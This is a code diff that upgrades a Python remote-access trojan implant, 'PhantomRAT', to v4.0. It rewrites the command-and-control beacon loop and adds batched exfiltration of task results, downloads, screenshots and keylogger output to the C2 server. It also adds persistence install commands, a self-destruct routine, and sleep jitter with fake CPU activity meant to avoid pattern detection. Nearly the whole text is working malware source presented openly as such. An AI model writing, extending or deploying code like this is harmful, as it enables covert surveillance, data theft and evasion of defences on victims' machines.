+                result['output'] = {'success': True, 'interfaces': interfaces}
+                result['success'] = True
+            except Exception as e:
+                result['output'] = {'error': str(e)}
+                
+        elif cmd == 'netstat':
+            connections = []
+            try:
+                for conn in psutil.net_connections(kind='inet'):
+                    connections.append({
+                        'fd': conn.fd,
+                        'family': conn.family,
+                        'type': conn.type,
+                        'laddr': f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else None,
+                        'raddr': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else None,
+                        'status': conn.status,
+                        'pid': conn.pid
+                    })
+                result['output'] = {'success': True, 'connections': connections[:100]}
+                result['success'] = True
+            except Exception as e:
+                result['output'] = {'error': str(e)}
+                
+        # ========== PERSISTENCE COMMANDS ==========
+        elif cmd == 'persist':
+            if MODULES['persistence']:
+                try:
+                    success = MODULES['persistence'].install()
+                    result['output'] = {'success': success}
+                    result['success'] = success
+                except Exception as e:
+                    result['output'] = {'error': str(e)}
+            else:
+                result['output'] = {'error': 'Persistence module not available'}
+                
+        elif cmd == 'unpersist':
+            if MODULES['persistence']:
+                try:
+                    success = MODULES['persistence'].uninstall()
+                    result['output'] = {'success': success}
+                    result['success'] = success
+                except Exception as e:
+                    result['output'] = {'error': str(e)}
+            else:
+                result['output'] = {'error': 'Persistence module not available'}
+                
+        # ========== SPECIAL COMMANDS ==========
+        elif cmd == 'self_destruct':
+            result['output'] = {'message': 'Self-destruct initiated'}
+            result['success'] = True
+            # Schedule cleanup in separate thread
+            threading.Thread(target=self_destruct, daemon=True).start()
+            
+        elif cmd == 'sleep':
+            try:
+                seconds = int(args) if args else 30
+                result['output'] = {'message': f'Sleeping for {seconds} seconds'}
+                result['success'] = True
+                time.sleep(seconds)
+            except ValueError:
+                result['output'] = {'error': 'Invalid sleep duration'}
+                
+        elif cmd == 'update':
+            result['output'] = {'message': 'Update command received (not implemented)'}
+            result['success'] = True
+            
+        # ========== UNKNOWN COMMAND ==========
         else:
-            result['output'] = f'Unknown or unsupported command: {cmd}'
+            result['output'] = {'error': f'Unknown command: {cmd}'}
             result['success'] = False
             
     except Exception as e:
-        result['output'] = f'Error executing {cmd}: {str(e)}'
+        result['output'] = {'error': f'Command execution failed: {str(e)}'}
         result['success'] = False
     
     return result
 
-def cleanup_and_exit():
-    """Clean up and exit the implant"""
-    time.sleep(1)
-    print("[*] Self-destruct complete")
+def self_destruct():
+    """Clean up and exit"""
+    print(f"[*] Self-destruct sequence initiated")
+    
+    # Stop keylogger if running
+    global keylogger
+    if keylogger:
+        try:
+            keylogger.stop()
+        except:
+            pass
+    
+    # Send final heartbeat
+    try:
+        exfil_data({
+            'type': 'goodbye',
+            'implant_id': IMPLANT_ID,
+            'message': 'Self-destruct completed',
+            'timestamp': time.time()
+        })
+    except:
+        pass
+    
+    time.sleep(2)
+    print(f"[*] Goodbye!")
     os._exit(0)
 
-# ==================== MAIN LOOP ====================
-def sleep_obfuscated(base_duration=30, jitter=0.3):
-    """Sleep with obfuscation to avoid pattern detection"""
-    # Add jitter
+# ==================== OBFUSCATED SLEEP ====================
+def obfuscated_sleep(base_duration, jitter=0.4):
+    """Sleep with random jitter and pattern avoidance"""
+    # Add random jitter
     actual_duration = base_duration * random.uniform(1 - jitter, 1 + jitter)
     
-    # Split sleep into smaller intervals with random CPU activity
-    end_time = time.time() + actual_duration
-    while time.time() < end_time:
-        sleep_time = random.uniform(0.5, 2.0)
-        time.sleep(sleep_time)
+    # Split into random intervals
+    elapsed = 0
+    while elapsed < actual_duration:
+        chunk = random.uniform(0.5, min(3.0, actual_duration - elapsed))
+        time.sleep(chunk)
+        elapsed += chunk
         
-        # Perform harmless CPU activity
-        _ = [i * i for i in range(random.randint(10, 100))]
+        # Random CPU activity to avoid pattern detection
+        if random.random() < 0.3:
+            _ = sum(i * i for i in range(random.randint(10, 50)))
 
+# ==================== MAIN LOOP v4.0 ====================
 def main_loop():
-    """Main implant loop"""
-    print(f"[*] PhantomRAT v3.0 Implant Starting...")
+    """Main implant loop for C2 v4.0"""
+    print(f"""
+    ╔══════════════════════════════════════════════════╗
+    ║           PHANTOM RAT IMPLANT v4.0              ║
+    ║            C2 Compatible Edition                ║
+    ╚══════════════════════════════════════════════════╝
+    """)
+    
+    print(f"[*] Starting PhantomRAT v4.0 Implant")
     print(f"[*] C2 Server: {C2_SERVER}")
-    print(f"[*] Enhanced System Info: {'Available' if SYSINFO_AVAILABLE else 'Not available'}")
+    print(f"[*] Session ID: {SESSION_ID}")
     print(f"[*] GUI Modules: {'Available' if GUI_MODULES_AVAILABLE else 'Not available'}")
-    
-    # Register with C2
-    max_retries = 3
-    for attempt in range(max_retries):
-        print(f"[*] Registration attempt {attempt + 1}/{max_retries}")
-        if register_implant():
-            break
-        if attempt < max_retries - 1:
-            print(f"[*] Retrying in 10 seconds...")
-            time.sleep(10)
-    else:
-        print("[-] All registration attempts failed. Exiting.")
-        return
-    
-    print(f"[*] Entering main command loop...")
-    print(f"[*] Beacon interval: 30-45 seconds")
+    print(f"[*] Enhanced Info: {'Available' if SYSINFO_AVAILABLE else 'Not available'}")
     print("-" * 50)
     
-    task_results = []
+    # Initial registration
+    print(f"[*] Attempting initial beacon...")
+    initial_tasks = beacon_checkin()
+    
+    if initial_tasks is not None:
+        print(f"[+] Connected to C2 server")
+        print(f"[*] Initial tasks: {len(initial_tasks)}")
+    else:
+        print(f"[-] Failed to connect to C2 server")
+        print(f"[*] Will retry in main loop...")
+    
+    task_queue = []
     failed_beacons = 0
     max_failed_beacons = 5
     
+    print(f"[*] Entering main loop...")
+    print(f"[*] Beacon interval: 20-40 seconds")
+    print(f"[*] Max failed beacons before backoff: {max_failed_beacons}")
+    print("-" * 50)
+    
     while True:
         try:
-            # Sleep with obfuscation
-            sleep_obfuscated(30, 0.3)
+            # ========== BEACON PHASE ==========
+            current_tasks = beacon_checkin()
             
-            # Check for tasks from C2
-            tasks = beacon()
-            
-            if tasks is None:
+            if current_tasks is None:
                 failed_beacons += 1
                 print(f"[!] Beacon failed ({failed_beacons}/{max_failed_beacons})")
                 
                 if failed_beacons >= max_failed_beacons:
-                    print("[!] Too many failed beacons. Possible C2 outage.")
-                    time.sleep(300)  # Back off for 5 minutes
+                    print(f"[!] Too many failed beacons. Backing off for 5 minutes.")
+                    time.sleep(300)
                     failed_beacons = 0
-                continue
-            
-            # Reset failed beacon counter on success
-            failed_beacons = 0
-            
-            # Process tasks
-            for task in tasks:
-                print(f"[*] Processing task: {task.get('command', 'unknown')}")
-                result = handle_command(task)
-                task_results.append(result)
-            
-            # Send task results back to C2
-            if task_results:
-                exfil_data({
-                    'type': 'task_results',
-                    'implant_id': IMPLANT_ID,
-                    'task_results': task_results,
-                    'timestamp': time.time()
-                })
-                print(f"[+] Sent {len(task_results)} task results to C2")
-                task_results.clear()
-            
-            # Send heartbeat every few cycles
-            if random.random() < 0.25:  # 25% chance each loop
-                heartbeat_data = {
-                    'type': 'heartbeat',
-                    'implant_id': IMPLANT_ID,
-                    'alive': True,
-                    'timestamp': time.time(),
-                    'system_info_brief': {
-                        'cpu_percent': os.getloadavg()[0] if hasattr(os, 'getloadavg') else 0,
-                        'memory_available': os.sysconf('SC_AVPHYS_PAGES') * os.sysconf('SC_PAGE_SIZE') 
-                                          if hasattr(os, 'sysconf') else 0
-                    }
-                }
-                exfil_data(heartbeat_data)
+                    continue
+            else:
+                # Reset failed counter on success
+                if failed_beacons > 0:
+                    print(f"[+] Beacon successful after {failed_beacons} failures")
+                    failed_beacons = 0
                 
+                # Add new tasks to queue
+                if current_tasks and isinstance(current_tasks, list):
+                    task_queue.extend(current_tasks)
+                    print(f"[+] Received {len(current_tasks)} new tasks")
+            
+            # ========== TASK PROCESSING PHASE ==========
+            processed_results = []
+            
+            while task_queue:
+                task = task_queue.pop(0)
+                print(f"[*] Processing task {task.get('id', 'unknown')}: {task.get('command', 'unknown')}")
+                
+                # Execute command
+                result = handle_command_v4(task)
+                processed_results.append(result)
+                
+                # Send result immediately for important commands
+                if task.get('command') in ['download', 'screenshot', 'keylog_stop']:
+                    try:
+                        exfil_data(result, task.get('id'))
+                        print(f"[+] Sent immediate result for task {task.get('id', 'unknown')}")
+                    except Exception as e:
+                        print(f"[!] Failed to send immediate result: {e}")
+                
+                # Small delay between tasks
+                time.sleep(random.uniform(0.5, 2.0))
+            
+            # ========== RESULT EXFILTRATION PHASE ==========
+            if processed_results:
+                print(f"[*] Sending {len(processed_results)} task results to C2")
+                
+                # Batch results for efficiency
+                batch_size = 5
+                for i in range(0, len(processed_results), batch_size):
+                    batch = processed_results[i:i + batch_size]
+                    
+                    result_payload = {
+                        'type': 'task_results',
+                        'implant_id': IMPLANT_ID,
+                        'session_id': SESSION_ID,
+                        'results': batch,
+                        'timestamp': time.time()
+                    }
+                    
+                    try:
+                        exfil_response = exfil_data(result_payload)
+                        if exfil_response and exfil_response.get('status') == 'success':
+                            print(f"[+] Batch {i//batch_size + 1} sent successfully")
+                        else:
+                            print(f"[!] Failed to send batch {i//batch_size + 1}")
+                    except Exception as e:
+                        print(f"[!] Error sending batch: {e}")
+                    
+                    # Small delay between batches
+                    if i + batch_size < len(processed_results):
+                        time.sleep(random.uniform(1.0, 3.0))
+            
+            # ========== RANDOMIZED SLEEP ==========
+            # Base sleep with jitter and random variance
+            base_sleep = random.uniform(20, 40)
+            print(f"[*] Sleeping for {base_sleep:.1f} seconds")
+            obfuscated_sleep(base_sleep, jitter=0.3)
+            
+            # ========== RANDOM SYSTEM CHECK ==========
+            if random.random() < 0.2:  # 20% chance each cycle
+                print(f"[*] Performing random system check")
+                try:
+                    # Quick system status
+                    status = {
+                        'cpu_percent': psutil.cpu_percent(interval=0.1),
+                        'memory_percent': psutil.virtual_memory().percent,
+                        'disk_free': psutil.disk_usage('/').free,
+                        'timestamp': time.time()
+                    }
+                    
+                    # Send heartbeat
+                    heartbeat = {
+                        'type': 'heartbeat',
+                        'implant_id': IMPLANT_ID,
+                        'status': 'active',
+                        'system_status': status,
+                        'session_id': SESSION_ID,
+                        'timestamp': time.time()
+                    }
+                    
+                    exfil_data(heartbeat)
+                except Exception as e:
+                    print(f"[!] System check error: {e}")
+            
         except KeyboardInterrupt:
-            print("\n[*] Interrupted by user")
+            print(f"\n[*] Interrupted by user")
             break
+            
         except Exception as e:
             print(f"[!] Main loop error: {e}")
             import traceback
             traceback.print_exc()
-            time.sleep(60)  # Back off on error
+            print(f"[*] Recovering in 60 seconds...")
+            time.sleep(60)
+
+# ==================== TEST MODE ====================
+def test_mode():
+    """Test mode for debugging"""
+    print(f"[*] Running in TEST mode")
+    
+    # Test system info
+    print(f"\n[*] Testing system info...")
+    info = get_comprehensive_system_info()
+    print(f"[+] System info collected:")
+    print(f"    Hostname: {info.get('hostname')}")
+    print(f"    OS: {info.get('os')} {info.get('os_version')}")
+    print(f"    IP: {info.get('ip')}")
+    print(f"    Memory: {info.get('memory_total_gb')}GB total")
+    
+    # Test encryption
+    print(f"\n[*] Testing encryption...")
+    test_data = {'test': 'data', 'timestamp': time.time()}
+    encrypted = encryption.encrypt(test_data)
+    decrypted = encryption.decrypt(encrypted)
+    print(f"[+] Encryption test: {'PASS' if decrypted and decrypted.get('test') == 'data' else 'FAIL'}")
+    
+    # Test command execution
+    print(f"\n[*] Testing command execution...")
+    test_commands = [
+        {'command': 'ping', 'arguments': ''},
+        {'command': 'get_id', 'arguments': ''},
+        {'command': 'ls', 'arguments': '.'}
+    ]
+    
+    for cmd in test_commands:
+        print(f"\n[*] Testing: {cmd['command']}")
+        result = handle_command_v4(cmd)
+        print(f"    Success: {result['success']}")
+        if result['output']:
+            output_preview = str(result['output'])[:100]
+            print(f"    Output: {output_preview}...")
+    
+    print(f"\n[*] Test complete")
 
 # ==================== ENTRY POINT ====================
 def main():
     """Main entry point"""
-    print("""
-    ╔══════════════════════════════════════════════════╗
-    ║               PHANTOMRAT IMPLANT                 ║
-    ║               v3.0 - Biggest Wells               ║
-    ╚══════════════════════════════════════════════════╝
-    """)
+    import sys
     
-    # Check if running in test mode
+    # Parse arguments
     if len(sys.argv) > 1:
         if sys.argv[1] == "--test":
-            print("[*] Running in test mode")
-            print(f"[*] Basic System Info: {json.dumps(get_basic_system_info(), indent=2)}")
-            
-            if SYSINFO_AVAILABLE:
-                print(f"[*] Enhanced System Info available")
-                try:
-                    enhanced_info = system_info.get_comprehensive_info()
-                    print(f"[*] Enhanced info keys: {list(enhanced_info.keys())}")
-                except Exception as e:
-                    print(f"[!] Enhanced info error: {e}")
-            
-            # Test network scan
-            print(f"[*] Testing network scan...")
-            scan_result = map_network('127.0.0.0/24')
-            print(f"[*] Network scan result: {scan_result}")
-            
-            # Test command execution
-            test_commands = [
-                {'command': 'ping', 'arguments': ''},
-                {'command': 'get_id', 'arguments': ''},
-                {'command': 'sysinfo_basic', 'arguments': ''}
-            ]
-            
-            for cmd in test_commands:
-                print(f"\n[*] Testing command: {cmd['command']}")
-                result = handle_command(cmd)
-                print(f"[*] Result: {result}")
-            
-            print("\n[*] Test complete")
+            test_mode()
             return
-        
-        elif sys.argv[1] == "--register":
-            print("[*] Registration test only")
-            register_implant()
+        elif sys.argv[1] == "--help":
+            print(f"""
+PhantomRAT Implant v4.0
+Usage: python3 main.py [OPTIONS]
+
+Options:
+  --test     Run in test mode (no C2 communication)
+  --help     Show this help message
+  --once     Run one beacon cycle and exit
+  --id       Show implant ID and exit
+
+Examples:
+  python3 main.py --test
+  python3 main.py
+            """)
+            return
+        elif sys.argv[1] == "--once":
+            print(f"[*] Running single beacon cycle")
+            tasks = beacon_checkin()
+            print(f"[*] Received {len(tasks) if tasks else 0} tasks")
+            if tasks:
+                for task in tasks:
+                    result = handle_command_v4(task)
+                    print(f"[*] Task {task.get('id')}: {result['success']}")
+            return
+        elif sys.argv[1] == "--id":
+            # Generate ID without beaconing
+            host_hash = hashlib.sha256(socket.gethostname().encode()).hexdigest()[:12]
+            implant_id = f"PHANTOM-{host_hash.upper()}"
+            print(f"Implant ID: {implant_id}")
+            print(f"Session ID: {SESSION_ID}")
+            print(f"Hostname: {socket.gethostname()}")
             return
     
-    # Run main loop
+    # Check dependencies
+    required_modules = ['requests', 'cryptography', 'psutil']
+    missing_modules = []
+    
+    for module in required_modules:
+        try:
+            __import__(module)
+        except ImportError:
+            missing_modules.append(module)
+    
+    if missing_modules:
+        print(f"[!] Missing required modules: {', '.join(missing_modules)}")
+        print(f"[*] Install with: pip install {' '.join(missing_modules)}")
+        sys.exit(1)
+    
+    # Start main loop
     try:
         main_loop()
     except KeyboardInterrupt:
-        print("\n[*] Shutting down...")
+        print(f"\n[*] Shutdown requested")
+        print(f"[*] Cleaning up...")
     except Exception as e:
         print(f"[!] Fatal error: {e}")
         import traceback
         traceback.print_exc()
-        time.sleep(300)
+        print(f"[*] Attempting to restart in 30 seconds...")
+        time.sleep(30)
+        main()
 
 if __name__ == "__main__":
-    # First, load encryption key
-    load_encryption_key()
-    
-    # Check for required dependencies
-    try:
-        import requests
-        import cryptography
-        import psutil
-    except ImportError as e:
-        print(f"[!] Missing required dependency: {e}")
-        print("[*] Install with: pip install requests cryptography psutil")
-        sys.exit(1)
-    
     main()
